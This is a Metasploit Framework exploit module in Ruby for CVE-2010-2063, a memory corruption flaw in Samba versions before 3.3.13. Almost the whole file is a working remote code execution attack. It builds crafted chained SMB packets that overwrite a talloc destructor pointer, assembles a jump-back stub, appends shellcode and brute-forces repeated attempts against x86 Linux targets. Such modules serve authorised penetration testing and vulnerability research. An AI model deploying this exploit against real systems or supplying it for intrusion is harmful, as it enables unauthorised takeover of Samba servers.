##
# $Id: chain_reply.rb 10238 2010-09-04 02:10:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Samba chain_reply Memory Corruption (Linux x86)',
			'Description'    => %q{
					This exploits a memory corruption vulnerability present in Samba versions
				prior to 3.3.13. When handling chained response packets, Samba fails to validate
				the offset value used when building the next part. By setting this value to a
				number larger than the destination buffer size, an attacker can corrupt memory.
				Additionally, setting this value to a value smaller than 'smb_wct' (0x24) will
				cause the header of the input buffer chunk to be corrupted.

				After close inspection, it appears that 3.0.x versions of Samba are not
				exploitable. Since they use an "InputBuffer" size of 0x20441, an attacker cannot
				cause memory to be corrupted in an exploitable way. It is possible to corrupt the
				heap header of the "InputBuffer", but it didn't seem possible to get the chunk
				to be processed again prior to process exit.

				In order to gain code execution, this exploit attempts to overwrite a "talloc
				chunk" destructor function pointer.

				This particular module is capable of exploiting the flaw on x86 Linux systems
				that do not have the nx memory protection.

				NOTE: It is possible to make exploitation attempts indefinitely since Samba forks
				for user sessions in the default configuration.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10238 $',
			'References'     =>
				[
					[ 'CVE', '2010-2063' ],
					[ 'OSVDB', '65518' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=873' ]
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 0x600,
					'BadChars' => "",
				},
			'Platform'       => 'linux',
			'Targets'        =>
				[
					[ 'Linux (Debian5 3.2.5-4lenny6)',
						{
							'Offset2'      => 0x1fec,
							'Bruteforce'   =>
								{
									'Start' => { 'Ret' => 0x081ed5f2 }, # jmp ecx (smbd bin)
									'Stop'  => { 'Ret' => 0x081ed5f2 },
									'Step'  => 0x300 # not used
								}
						}
					],

					[ 'Debugging Target',
						{
							'Offset2'      => 0x1fec,
							'Bruteforce'   =>
								{
									'Start' => { 'Ret' => 0xAABBCCDD },
									'Stop'  => { 'Ret' => 0xAABBCCDD },
									'Step'  => 0x300
								}
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 16 2010'))

		register_options(
			[
				Opt::RPORT(139)
			], self.class)
	end

	#
	# Note: this code is duplicated from lib/rex/proto/smb/client.rb
	#
	# Authenticate using clear-text passwords
	#
	def session_setup_clear_ignore_response(user = '', pass = '', domain = '')

		data = [ pass, user, domain, self.simple.client.native_os, self.simple.client.native_lm ].collect{ |a| a + "\x00" }.join('');

		pkt = CONST::SMB_SETUP_LANMAN_PKT.make_struct
		self.simple.client.smb_defaults(pkt['Payload']['SMB'])

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
		pkt['Payload']['SMB'].v['Flags1'] = 0x18
		pkt['Payload']['SMB'].v['Flags2'] = 0x2001
		pkt['Payload']['SMB'].v['WordCount'] = 10
		pkt['Payload'].v['AndX'] = 255
		pkt['Payload'].v['MaxBuff'] = 0xffdf
		pkt['Payload'].v['MaxMPX'] = 2
		pkt['Payload'].v['VCNum'] = 1
		pkt['Payload'].v['PasswordLen'] = pass.length + 1
		pkt['Payload'].v['Capabilities'] = 64
		pkt['Payload'].v['SessionKey'] = self.simple.client.session_id
		pkt['Payload'].v['Payload'] = data

		self.simple.client.smb_send(pkt.to_s)
		ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
	end


	def brute_exploit(addrs)

		curr_ret = addrs['Ret']

		# Although ecx always points at our buffer, sometimes the heap data gets modified
		# and nips off the final byte of our 5 byte jump :(
		#
		# Solution: try repeatedly until we win.
		#
		50.times{

			begin
				print_status("Trying return address 0x%.8x..." %  curr_ret)

				connect
				self.simple.client.session_id = rand(31337)

				#select(nil,nil,nil,2)
				#puts "press any key"; $stdin.gets

				#
				# This allows us to allocate a talloc_chunk after the input buffer.
				# If doing so fails, we are lost ...
				#
				10.times {
					session_setup_clear_ignore_response('', '', '')
				}

				# We re-use a pointer from the stack and jump back to our original "inbuf"
				distance = target['Offset2'] - 0x80
				jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{distance}").encode_string

				tlen = 0xc00
				trans =
					"\x00\x04" +
					"\x08\x20" +
					"\xff"+"SMB"+
					# SMBlogoffX
					[0x74].pack('V') +
					# tc->next, tc->prev
					jmp_back + ("\x42" * 3) +
					#("A" * 4) + ("B" * 4) +
					# tc->parent, tc->child
					"CCCCDDDD" +
					# tc->refs, must be zero
					("\x00" * 4) +
					# over writes tc->destructor
					[addrs['Ret']].pack('V') +
					"\x00\x00\x00\x00"+
					"\xd0\x07\x0c\x00"+
					"\xd0\x07\x0c\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\xd0\x07"+
					"\x43\x00\x0c\x00"+
					"\x14\x08\x01\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x90"

					# We put the shellcode first, since only part of this packet makes it into memory.
					trans << payload.encoded
					trans << rand_text(tlen - trans.length)

					# Set what eventually becomes 'smb_off2' to our unvalidated offset value.
					smb_off2 = target['Offset2']
					trans[39,2] = [smb_off2].pack('v')

					sock.put(trans)

				rescue EOFError
					# nothing
				rescue => e
					print_error("#{e}")
				end

				handler
				disconnect

				# See if we won yet..
				select(nil,nil,nil, 1)
				break if session_created?
			}
	end

end
